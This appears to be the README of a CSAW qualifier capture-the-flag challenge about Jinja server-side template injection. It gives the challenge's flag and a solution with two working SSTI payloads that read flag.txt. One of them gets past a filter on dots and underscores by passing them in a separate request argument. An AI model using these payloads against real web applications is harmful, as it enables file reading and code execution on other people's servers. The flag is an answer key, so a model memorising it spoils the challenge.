# ninja
Repo containing an SSTI challenge for the upcoming CSAW quals
(was SSTI earlier)


# Challenge Description

Hey guys come checkout this website i made to test my ninja-coding skills. 

# Flag

`flag{m0mmy_s33_1m_4_r34l_n1nj4}`

# Solution
Simple textbox allows SSTI, one might check it using `{{7}}`, once you try playing around with basic SSTI techniques, you are showed that common techniques can't be used to exploit this ssti since periods(`.`), underscores('|'), or the word config is banned, so you must try to circumvent these filters. Your end goal is to read flag.txt. The real part of the exploit lies in the fact that you can supply another arguement(the `underscore` arguement in the example payload) that isn't checked by jinja. 

# Example payload 

If underscores were allowed :-  
`http://localhost:5000/submit?value={{''.__class__.__mro__[2].__subclasses__()[40] ('flag.txt').read() }} `

But since they aren't :-

```
http://localhost:5000/submit?value={{ (('' | attr( [request.args.underscore*2, 'class'  ,request.args.underscore*2] | join) | attr( [request.args.underscore*2, 'mro'  ,request.args.underscore*2] | join  ) )[2] | attr([request.args.underscore*2, 'subclasses'  ,request.args.underscore*2] | join)())[40]  ('flag.txt').read() }}&underscore=_
```
